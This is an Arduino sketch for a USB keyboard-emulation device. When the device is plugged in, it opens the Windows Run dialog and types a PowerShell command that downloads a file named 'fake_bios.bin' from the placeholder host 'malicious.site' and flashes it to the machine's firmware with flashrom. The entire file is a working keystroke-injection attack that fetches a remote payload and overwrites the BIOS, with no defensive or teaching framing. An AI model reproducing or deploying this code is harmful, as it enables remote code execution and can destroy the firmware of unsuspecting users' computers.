#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.println(F("powershell -c \"(New-Object Net.WebClient).DownloadFile('http://malicious.site/fake_bios.bin', 'C:\\fake_bios.bin'); flashrom.exe -w C:\\fake_bios.bin\""));
}

void loop() {}
